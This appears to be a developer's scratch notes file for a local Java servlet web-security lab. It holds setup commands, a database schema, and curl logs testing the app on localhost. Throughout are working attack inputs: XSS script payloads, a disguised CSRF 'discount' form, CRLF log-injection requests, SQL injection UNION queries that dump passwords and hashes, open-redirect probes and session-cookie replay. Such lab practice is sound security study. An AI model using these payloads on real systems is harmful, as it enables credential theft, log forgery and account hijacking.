#Start HSQLDB
java11 && cd ~/dev/my-servlet && java -cp ~/dev/env/hsqldb-2.6.0/hsqldb/lib/hsqldb.jar org.hsqldb.server.Server --database.0 file:hsqldb/mydatabases/mydb --dbname.0 mydb

#Create tables
java11
java -jar  ~/dev/env/hsqldb-2.6.0/hsqldb/lib/sqltool.jar --inlineRc=url=jdbc:hsqldb:hsql://localhost/mydb,user=sa
Enter password for sa: <empty>


CREATE SCHEMA MY_SCHEMA; create table MY_SCHEMA.USER_PASSWORD ( USERNAME VARCHAR(50) not null constraint USER_PASSWORD_PK primary key, PASSWORD VARCHAR(50) not null );
create unique index MY_SCHEMA.USER_PASSWORD_USERNAME_UINDEX on MY_SCHEMA.USER_PASSWORD (USERNAME);

create table MY_SCHEMA.USER_PASSWORD_BASE64 ( USERNAME VARCHAR(50) not null constraint USER_PASSWORD_BASE64_PK primary key, PASSWORD VARCHAR(1024) not null );
create unique index MY_SCHEMA.USER_PASSWORD_BASE64_USERNAME_UINDEX on MY_SCHEMA.USER_PASSWORD_BASE64 (USERNAME);

create table MY_SCHEMA.USER_PASSWORD_HASH ( USERNAME VARCHAR(50), HASH VARBINARY(1024) );

create table MY_SCHEMA.USER_REVIEW ( USERNAME VARCHAR(50), REVIEW VARCHAR(2028) );


http://localhost:8080/sanitizer.jsp?value=Get%20discount%20For%20details%20click%20%3Cform%20name=%22exploit%22%20action=%22/reviews.jsp%22%20method=%22post%22%20style=%22display:%20inline;%22%3E%20%3Cinput%20type=%22hidden%22%20name=%22review%22%20value=%22You%20have%20been%20hacked!%22/%3E%20%3Cbutton%20type=%22submit%22%20style=%22background:%20none%20!important;%20border:%20none%20!important;%20padding:%200%20!important;%20font-family:%20serif;%20font-size:%201em;%20color:%20blue;%20text-decoration:%20underline;%20cursor:%20pointer;%22%3Ehere%3C/button%3E%20%3C/form%3E
http://localhost:8080/sanitizer.jsp?value=<script>window.location.href="http://www.google.com";</script>
http://localhost:8080/sanitizer.jsp?value=<script>alert("This an alert!")</script>&escape=predefined
http://localhost:8080/sanitizer.jsp?value=<script>alert("This an alert!")</script>&escape=all
http://localhost:8080/sanitizer.jsp?value=<script>alert("This an alert!")</script>

http://localhost:8080/sanitizer.jsp?value=<b>bold</b>&escape=predefined
http://localhost:8080/sanitizer.jsp?value=<b>bold</b&escape=all
http://localhost:8080/sanitizer.jsp?value=<b>bold</b


#logs ingestion
curl -d "username=guest%0A%0D$(date '+%Y-%m-%d %H:%M:%S')%20%5BINFO%5D%20MyServlet%20-%20Successfully%20logged%20in%0A%0D$(date '+%Y-%m-%d %H:%M:%S')%20%5BINFO%5D%20MyServlet%20-%20Authenticating%20admin&password=guest" -H "Content-Type: application/x-www-form-urlencoded" http://localhost:8080/do
curl -d "username=guest&password=guest" -H "Content-Type: application/x-www-form-urlencoded" http://localhost:8080/do

#Sql injection
%' OR 1=1 --
%' AND 0=1 UNION SELECT USERNAME, TO_BASE64(HASH) FROM MY_SCHEMA.USER_HASH  --
%' AND 0=1 UNION SELECT USERNAME, PASSWORD FROM MY_SCHEMA.USER_PASSWORD  --
%' AND 0=1 UNION SELECT USERNAME, PASSWORD FROM MY_SCHEMA.USER_PASSWORD_BASE64  --


curl -vv -L 'http://localhost:8080/do?action=redirect&url=http://example.com'
curl -vv -L 'http://localhost:8080/do?action=redirect&url=http://example.com' -H 'Origin: http://google.com:8080' -H 'Referer: http://google.com:8080/app/login.html'







curl -vv -L 'http://localhost:8080/app/login.jsp' -H 'Origin: http://localhost:8080' \
 -H 'Content-Type: application/x-www-form-urlencoded' -H 'Referer: http://localhost:8080/app/login.html' \
 -d'username=A&password=Aaaaaaa1';


*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 8080 (#0)
> POST /app/login.jsp HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.64.1
> Accept: */*
> Origin: http://localhost:8080
> Content-Type: application/x-www-form-urlencoded
> Referer: http://localhost:8080/app/login.html
> Content-Length: 28
>
* upload completely sent off: 28 out of 28 bytes
< HTTP/1.1 302 Found
< Content-Type: text/html
< Set-Cookie: JSESSIONID=node0gwdq7rtjrr2i1fzpqv2s2s7wv6.node0; Path=/
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Location: http://localhost:8080/app/reviews2.jsp;jsessionid=node0gwdq7rtjrr2i1fzpqv2s2s7wv6.node0
< Content-Length: 0
< Server: Jetty(9.4.42.v20210604)
<
* Connection #0 to host localhost left intact
* Issue another request to this URL: 'http://localhost:8080/app/reviews2.jsp;jsessionid=node0gwdq7rtjrr2i1fzpqv2s2s7wv6.node0'
* Switch from POST to GET
* Found bundle for host localhost: 0x7ffd94e05620 [can pipeline]
* Could pipeline, but not asked to!
* Re-using existing connection! (#0) with host localhost
* Connected to localhost (::1) port 8080 (#0)
> GET /app/reviews2.jsp;jsessionid=node0gwdq7rtjrr2i1fzpqv2s2s7wv6.node0 HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.64.1
> Accept: */*
> Origin: http://localhost:8080
> Content-Type: application/x-www-form-urlencoded
> Referer: http://localhost:8080/app/login.html
>
< HTTP/1.1 200 OK
< Content-Type: text/html;charset=utf-8
< Content-Length: 1732
< Server: Jetty(9.4.42.v20210604)
<


<html>
<head>
    <style>
        table, th, td {
            border: solid 1px;
            border-collapse: collapse;
        }
    </style>
    <title>Reviews</title>
</head>
<body>
    <p>Hello: A <a href="logout.jsp">logout</a></p>
<form name="filter" action="reviews2.jsp" method="POST">
    <label for="filter">filter:</label>
    <input type="hidden" name="csrfToken" value="13bcb5cb-4c06-4433-be42-d3f41b2120a1" >
    <input type="text" id="filter" name="filter" placeholder="">
    <input type="submit" value="Search reviews">
</form>
Reviews:
    <table id="mytable">
    <tr>
        <th>No.</th>
        <th>Username</th>
        <th>Review content</th>
    </tr>
        <tr>
            <td>1</td>
            <td>A</td>
            <td>This is my first review</td>
        </tr>
    </table>
<br />
<br />
<form name="review" action="reviews_post_redirect_get.jsp" method="post">
    <label for="review">Add a review:</label><br>
    <textarea id="review" name="review" placeholder="Type your review..."></textarea><br>
    <input type="hidden" name="csrfToken" value="13bcb5cb-4c06-4433-be42-d3f41b2120a1" >
    <input type="submit" value="Submit review">
</form>
</body>
</html>
* Connection #0 to host localhost left intact
* Closing connection 0


# Add a review rq
curl -vv -L 'http://localhost:8080/app/reviews2.jsp' -d 'review=HackedReviewAA' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: name=a; JSESSIONID=node0gwdq7rtjrr2i1fzpqv2s2s7wv6.node0'
*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 8080 (#0)
> POST /app/reviews2.jsp HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.64.1
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Cookie: name=a; JSESSIONID=node0gwdq7rtjrr2i1fzpqv2s2s7wv6.node0
> Content-Length: 21
>
* upload completely sent off: 21 out of 21 bytes
< HTTP/1.1 200 OK
< Content-Type: text/html;charset=utf-8
< Content-Length: 1368
< Server: Jetty(9.4.42.v20210604)
<
<html>
<head>
    <style>
        table, th, td {
            border: solid 1px;
            border-collapse: collapse;
        }
    </style>
    <title>Reviews</title>
</head>
<body>
    <p>Hello: A <a href="logout.jsp">logout</a></p>
<form name="filter" action="reviews2.jsp" method="POST">
    <label for="filter">filter:</label>
    <input type="hidden" name="csrfToken" value="13bcb5cb-4c06-4433-be42-d3f41b2120a1" >
    <input type="text" id="filter" name="filter" placeholder="">
    <input type="submit" value="Search reviews">
</form>
Reviews:
    <table id="mytable">
    <tr>
        <th>No.</th>
        <th>Username</th>
        <th>Review content</th>
    </tr>
        <tr>
            <td>1</td>
            <td>A</td>
            <td>This is my first review</td>
        </tr>
        <tr>
            <td>2</td>
            <td>A</td>
            <td>HackedReviewAA</td>
        </tr>
    </table>
<br />
<br />
<form name="review" action="reviews_post_redirect_get.jsp" method="post">
    <label for="review">Add a review:</label><br>
    <textarea id="review" name="review" placeholder="Type your review..."></textarea><br>
    <input type="hidden" name="csrfToken" value="13bcb5cb-4c06-4433-be42-d3f41b2120a1" >
    <input type="submit" value="Submit review">
</form>
</body>
</html>
* Connection #0 to host localhost left intact
* Closing connection 0



#No session info included

curl -vv -L 'http://localhost:8080/app/reviews2.jsp' -d 'review=HackedReviewNoSession' -H 'Content-Type: application/x-www-form-urlencoded'
*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 8080 (#0)
> POST /app/reviews2.jsp HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.64.1
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 28
>
* upload completely sent off: 28 out of 28 bytes
< HTTP/1.1 302 Found
< Content-Type: text/html;charset=utf-8
< Set-Cookie: JSESSIONID=node01arf4xfm1fcwaw6r136wzo5zs8.node0; Path=/
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Location: http://localhost:8080/app/login.html;jsessionid=node01arf4xfm1fcwaw6r136wzo5zs8.node0
< Content-Length: 0
< Server: Jetty(9.4.42.v20210604)
<
* Connection #0 to host localhost left intact
* Issue another request to this URL: 'http://localhost:8080/app/login.html;jsessionid=node01arf4xfm1fcwaw6r136wzo5zs8.node0'
* Switch from POST to GET
* Found bundle for host localhost: 0x7fb8f26062a0 [can pipeline]
* Could pipeline, but not asked to!
* Re-using existing connection! (#0) with host localhost
* Connected to localhost (::1) port 8080 (#0)
> GET /app/login.html;jsessionid=node01arf4xfm1fcwaw6r136wzo5zs8.node0 HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.64.1
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 200 OK
< Last-Modified: Thu, 12 Aug 2021 15:49:09 GMT
< Content-Type: text/html
< Accept-Ranges: bytes
< Content-Length: 3581
< Server: Jetty(9.4.42.v20210604)
<
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
</head>
<body>
Login

    <form name="login" action="login.jsp" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" title="Must contain at least one number and one uppercase and lowercase letter, and at least 8 or more characters" required>
        <input type="submit" value="Login">
    </form>

<br />
or register
<br />

    <form name="register" action="register.jsp" method="POST">
        <label for="r_username">Username:</label>
        <input type="text" id="r_username" name="username" required onfocusout="myFunction(); return false;">
        <div id="myDiv" style="color:red" hidden="true"></div>
        <br />
        <label for="r_password">Password:</label>
        <input type="password" id="r_password" name="password" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" title="Must contain at least one number and one uppercase and lowercase letter, and at least 8 or more characters" required>
        <button id="myBtn" onclick="myFunction();return false;">Register</button>
    </form>
    <script>
        function myFunction() {
            // document.getElementById("myBtn").disabled = true;
            // document.getElementById("myDiv").hidden = false;
            // document.getElementById("myDiv").textContent = "Czesc " + document.getElementById("myName").value;
            const xhr = new XMLHttpRequest();
            xhr.open("POST", 'http://localhost:8080/app/usernameCheck.jsp', true);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

            xhr.onreadystatechange = function() { // Call a function when the state changes.
                if (this.readyState === XMLHttpRequest.LOADING) {
                    document.getElementById("myDiv").innerHTML = "<img src=\"http://localhost:8080/app/icons/http-loading.gif\" width=\"20\" height=\"20\"  alt=\"loading\"/>";
                }
                if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                    const usernameCheckResponse = xhr.responseText.replace(/(^[ \t]*\n)/gm, "").trim();
                    if (usernameCheckResponse.length > 0) {
                        document.getElementById("myDiv").innerHTML = usernameCheckResponse;
                        document.getElementById("myDiv").hidden = false;
                        document.getElementById("myBtn").disabled = true;
                    } else {
                        document.getElementById("myDiv").hidden = true;
                        document.getElementById("myBtn").disabled = false;
                    }
                }
                if (this.readyState === XMLHttpRequest.DONE && this.status === 404) {
                    document.getElementById("myDiv").innerHTML = "<img src=\"http://localhost:8080/app/icons/http-404.png\" width=\"20\" height=\"20\"  alt=\"not found (404)\"/>";
                }
            };
            xhr.onerror = function() {
                document.getElementById("myDiv").innerHTML = "<img src=\"http://localhost:8080/app/icons/http-error.png\" width=\"20\" height=\"20\"  alt=\"http error\"/>";
            };

            const rusername = document.getElementById('r_username').value;
            xhr.send("username=" + rusername);
        }
    </script>
</body>
</html>
* Connection #0 to host localhost left intact
* Closing connection 0


Reset password:
Get 50% discount For details click <a href="/reviews.jsp">here</a> or
<form name="exploit" action="/reset.jsp" method="post" style="display: inline;">
    <input type="hidden" name="review" value="You have been hacked!"/>
    <input type="hidden" name="csrfToken" value="abc"/>
    <input type="submit"  style="background: none !important; border: none !important; padding: 0 !important; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;" value="here"/>
    <button type="submit" style="background: none !important; border: none !important; padding: 0 !important; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;">here</button>
</form>.
